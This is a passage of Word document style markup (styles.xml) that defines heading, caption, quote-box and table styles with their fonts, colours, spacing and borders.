    <w:lsdException w:name="Hashtag" w:locked="0" w:semiHidden="1" w:unhideWhenUsed="1"/>
    <w:lsdException w:name="Unresolved Mention" w:locked="0" w:semiHidden="1" w:unhideWhenUsed="1"/>
    <w:lsdException w:name="Smart Link" w:locked="0" w:semiHidden="1" w:unhideWhenUsed="1"/>
  </w:latentStyles>
  <w:style w:type="paragraph" w:default="1" w:styleId="Normal">
    <w:name w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00E14991"/>
    <w:pPr>
      <w:spacing w:before="120"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="2E2D2C"/>
      <w:sz w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading1Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:locked/>
    <w:rsid w:val="002E3FCE"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="480" w:after="0"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:color w:val="003C74" w:themeColor="accent1" w:themeShade="BF"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading2">
    <w:name w:val="heading 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading2Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:locked/>
    <w:rsid w:val="00EA464A"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="200" w:after="0"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:color w:val="00519C" w:themeColor="accent1"/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading3">
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading3Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:locked/>
    <w:rsid w:val="00EA464A"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="200" w:after="0"/>
      <w:outlineLvl w:val="2"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:color w:val="00519C" w:themeColor="accent1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading4">
    <w:name w:val="heading 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading4Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:locked/>
    <w:rsid w:val="00267563"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="200" w:after="0"/>
      <w:outlineLvl w:val="3"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="00519C" w:themeColor="accent1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading5">
    <w:name w:val="heading 5"/>
    <w:basedOn w:val="Heading4"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading5Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:locked/>
    <w:rsid w:val="00267563"/>
    <w:pPr>
      <w:outlineLvl w:val="4"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading6">
    <w:name w:val="heading 6"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading6Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="200" w:after="0"/>
      <w:outlineLvl w:val="5"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="00284D" w:themeColor="accent1" w:themeShade="7F"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading7">
    <w:name w:val="heading 7"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading7Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="200" w:after="0"/>
      <w:outlineLvl w:val="6"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading8">
    <w:name w:val="heading 8"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading8Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="200" w:after="0"/>
      <w:outlineLvl w:val="7"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading9">
    <w:name w:val="heading 9"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading9Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:locked/>
    <w:rsid w:val="006164F0"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="200" w:after="0"/>
      <w:outlineLvl w:val="8"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>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semiHidden/>
    <w:rsid w:val="0045777F"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:color w:val="003C74" w:themeColor="accent1" w:themeShade="BF"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading2Char">
    <w:name w:val="Heading 2 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading2"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="0045777F"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:color w:val="00519C" w:themeColor="accent1"/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading3Char">
    <w:name w:val="Heading 3 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading3"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="0045777F"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:color w:val="00519C" w:themeColor="accent1"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading4Char">
    <w:name w:val="Heading 4 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading4"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="0045777F"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="00519C" w:themeColor="accent1"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading5Char">
    <w:name w:val="Heading 5 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading5"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="0045777F"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="00519C" w:themeColor="accent1"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading6Char">
    <w:name w:val="Heading 6 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading6"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00A75842"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="00284D" w:themeColor="accent1" w:themeShade="7F"/>
      <w:sz w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading7Char">
    <w:name w:val="Heading 7 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading7"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00A75842"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="63615F" w:themeColor="text1" w:themeTint="BF"/>
      <w:sz w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading8Char">
    <w:name w:val="Heading 8 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading8"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00A75842"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="63615F" w:themeColor="text1" w:themeTint="BF"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading9Char">
    <w:name w:val="Heading 9 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading9"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="006164F0"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="63615F" w:themeColor="text1" w:themeTint="BF"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QAHeadingH21NotinTOC">
    <w:name w:val="QA Heading (H2.1) Not in TOC"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00E14991"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:contextualSpacing/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Segoe UI Light" w:hAnsi="Segoe UI Light"/>
      <w:color w:val="005BAA"/>
      <w:sz w:val="36"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="TableHeading">
    <w:name w:val="Table Heading"/>
    <w:basedOn w:val="Normal"/>
    <w:semiHidden/>
    <w:qFormat/>
    <w:rsid w:val="00165E9F"/>
    <w:pPr>
      <w:framePr w:hSpace="180" w:wrap="around" w:vAnchor="text" w:hAnchor="margin" w:y="8"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Caption">
    <w:name w:val="caption"/>
    <w:aliases w:val="QA Caption"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="35"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:locked/>
    <w:rsid w:val="00BF5ED2"/>
    <w:pPr>
      <w:spacing w:after="200"/>
    </w:pPr>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="2E2D2C" w:themeColor="text1"/>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QAQuoteBox">
    <w:name w:val="QA Quote Box"/>
    <w:basedOn w:val="QABorderedText"/>
    <w:next w:val="Normal"/>
    <w:link w:val="QAQuoteBoxChar"/>
    <w:qFormat/>
    <w:rsid w:val="00AD3FF2"/>
    <w:pPr>
      <w:pBdr>
        <w:top w:val="single" w:sz="8" w:space="6" w:color="00519C" w:themeColor="accent1"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="single" w:sz="8" w:space="6" w:color="00519C" w:themeColor="accent1"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:pBdr>
      <w:ind w:left="851" w:right="1019"/>
      <w:contextualSpacing w:val="0"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="minorEastAsia" w:cs="Segoe UI"/>
      <w:color w:val="00519C" w:themeColor="accent1"/>
      <w:spacing w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QAQuoteBoxChar">
    <w:name w:val="QA Quote Box Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="QAQuoteBox"/>
    <w:rsid w:val="00AD3FF2"/>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="minorEastAsia" w:cs="Segoe UI"/>
      <w:color w:val="00519C" w:themeColor="accent1"/>
      <w:spacing w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC1">
    <w:name w:val="toc 1"/>
    <w:aliases w:val="QA TOC 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:rsid w:val="00FC6EE3"/>
    <w:pPr>
      <w:suppressLineNumbers/>
      <w:tabs>
        <w:tab w:val="right" w:leader="dot" w:pos="10205"/>
      </w:tabs>
    </w:pPr>
    <w:rPr>
      <w:noProof/>
      <w:spacing w:val="4"/>
      <w:lang w:eastAsia="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QAWebsites">
    <w:name w:val="QA Websites"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00965302"/>
    <w:pPr>
      <w:contextualSpacing/>
    </w:pPr>
    <w:rPr>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="001C1280"/>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1C1280"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="TableGrid">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="59"/>
    <w:locked/>
    <w:rsid w:val="00464C22"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:tblPr>
      <w:tblBorders>
        <w:top w:val="single" w:sz="4" w:space="0" w:color="2E2D2C" w:themeColor="text1"/>
        <w:left w:val="single" w:sz="4" w:space="0" w:color="2E2D2C" w:themeColor="text1"/>
        <w:bottom w:val="single" w:sz="4" w:space="0" w:color="2E2D2C" w:themeColor="text1"/>
        <w:right w:val="single" w:sz="4" w:space="0" w:color="2E2D2C" w:themeColor="text1"/>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="2E2D2C" w:themeColor="text1"/>
        <w:insideV w:val="single" w:sz="4" w:space="0" w:color="2E2D2C" w:themeColor="text1"/>
      </w:tblBorders>
    </w:tblPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index1">
    <w:name w:val="index 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00D4361C"/>
    <w:pPr>
      <w:spacing w:after="0"/>
      <w:ind w:left="220" w:hanging="220"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QATableNumbers">
    <w:name w:val="QA Table Numbers"/>
    <w:basedOn w:val="QATableBullets"/>
    <w:link w:val="QATableNumbersChar"/>
    <w:rsid w:val="00D32E5D"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="4"/>
      </w:numPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="284"/>
      </w:tabs>
    </w:pPr>
  </w:style>
  <w:style w:type="table" w:styleId="LightShading-Accent2">
    <w:name w:val="Light Shading Accent 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="60"/>
    <w:locked/>
    <w:rsid w:val="002676A4"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="971611" w:themeColor="accent2" w:themeShade="BF"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="CA1E17"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7C1BF" w:themeFill="accent2" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="F7C1BF" w:themeFill="accent2" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumShading1-Accent2">
    <w:name w:val="Medium Shading 1 Accent 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="63"/>
    <w:locked/>
    <w:rsid w:val="002676A4"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="CA1E17" w:themeFill="accent2"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="E9453F" w:themeColor="accent2" w:themeTint="BF"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F7C1BF" w:themeFill="accent2" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="F7C1BF" w:themeFill="accent2"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locked/>
    <w:rsid w:val="002676A4"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="A12BE8" w:themeColor="accent4" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="A12BE8" w:themeColor="accent4" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A12BE8" w:themeColor="accent4" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="A12BE8" w:themeColor="accent4" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="A12BE8" w:themeColor="accent4" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="A12BE8" w:themeColor="accent4" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="A12BE8" w:themeColor="accent4" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A12BE8" w:themeColor="accent4" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="A12BE8" w:themeColor="accent4" w:themeTint="BF"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="7713B2" w:themeFill="accent4"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="A12BE8" w:themeColor="accent4" w:themeTint="BF"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="A12BE8" w:themeColor="accent4" w:themeTint="BF"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A12BE8" w:themeColor="accent4" w:themeTint="BF"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="A12BE8" w:themeColor="accent4" w:themeTint="BF"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="E0B9F7" w:themeFill="accent4" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="E0B9F7" w:themeFill="accent4" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band2Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
